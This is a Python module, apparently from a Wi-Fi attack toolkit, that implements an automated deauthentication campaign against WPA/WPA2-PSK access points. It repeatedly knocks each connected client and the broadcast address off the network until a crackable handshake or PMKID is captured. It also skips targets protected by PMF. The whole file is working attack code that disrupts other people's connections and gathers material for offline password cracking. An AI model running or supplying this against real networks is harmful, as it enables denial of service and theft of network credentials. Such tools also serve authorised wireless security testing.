"""Deauth campaign: provoke a WPA/WPA2-PSK re-handshake for the always-on capture.

Round-robins each associated client with a two-way deauth burst, then a broadcast
deauth at the end of each round, until the passive capture records a NEW crackable
handshake (or the user stops). It needs no fake MAC and no association: a
channel-only lease for TX, and the sink for the stop condition. The always-on
capture fills ``ap.handshakes``; deauth only kicks clients into re-handshaking.
"""
from __future__ import annotations

import logging

from wifit3.crack.handshake import crackable_pairs, pmkid_crackable

from . import treelog
from .campaign import Campaign

logger = logging.getLogger(__name__)

BURST_ROUNDS = 10        # deauth_client rounds per client per pass (matches the one-shot X)
BCAST_COUNT = 20         # broadcast-deauth frames at the end of each round
SETTLE_SEC = 6.0         # wait after a burst for the provoked handshake to land

_PSK_AKMS = (0x02, 0x04, 0x06)   # PSK, FT-PSK, PSK-SHA256: yield a crackable 4-way


class DeauthCampaign(Campaign):
    """Deauth a WPA/WPA2-PSK target's clients until the capture records a new handshake."""

    button_id = "btn-deauth"
    key = "deauth"
    hotkey = ("D", "AutoDeauth")
    idle_label = "AutoDeauth"
    run_label = "Stop Deauth"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap) -> bool:
        """WPA/WPA2-PSK only: a PSK-family AKM must be confirmed and the AP must not
        require PMF (which protects the deauth). Hides WEP/open/SAE-only/unconfirmed."""
        if getattr(ap, "pmf_required", False):
            return False
        return bool(set(_PSK_AKMS) & set(getattr(ap, "akm_suites", None) or ()))

    def __init__(self, array, target, log=None):
        super().__init__(ap=target, array=array)
        self.target = target
        self.log = log or (lambda _m: None)
        self.client_acks = 0
        self.client_sent = 0
        self.bcast_sent = 0
        self.captured = False
        self._baseline = 0

    def _crackable_count(self) -> int:
        """How many crackable handshakes (4-way pairs + plain-PSK PMKIDs) the sink holds."""
        ap = self.array.access_points.get(self.target.bssid.lower())
        if ap is None:
            return 0
        total = 0
        for hs in ap.handshakes.values():
            total += len(crackable_pairs(hs))
            if hs.pmkid and pmkid_crackable(hs):
                total += 1
        return total

    def _new_capture(self) -> bool:
        """A crackable handshake landed since we started (baseline guards a pre-existing one)."""
        return self._crackable_count() > self._baseline

    def _target_clients(self) -> list[str]:
        target = self.target.bssid.lower()
        own = self.array.forged_macs
        return [mac for mac, c in self.array.clients.items()
                if (c.bssid or "").lower() == target and mac not in own]

    async def _settle(self) -> None:
        await self.array.wait_until(lambda: self._new_capture() or self.stopped, SETTLE_SEC)

    async def _loop(self) -> None:
        self._baseline = self._crackable_count()
        self.log(treelog.leaf(f"targeting {len(self._target_clients())} client(s) + broadcast"))
        async with self.array.lease(channel=self.target.channel, iface=self.iface) as iface:
            while not self.stopped and not self._new_capture():
                for mac in self._target_clients():
                    if self.stopped or self._new_capture():
                        break
                    self.log(f"Deauthing client [cyan]{mac}[/cyan]…")
                    res = await iface.deauth_client(self.target.bssid, mac, rounds=BURST_ROUNDS)
                    self.client_sent += res.total_sent
                    self.client_acks += res.total_acked
                    await self._settle()
                if self.stopped or self._new_capture():
                    break
                self.log("Deauthing [cyan]broadcast[/cyan]…")
                self.bcast_sent += await iface.deauth_broadcast(self.target.bssid,
                                                                count=BCAST_COUNT)
                await self._settle()
        self.captured = self._new_capture()
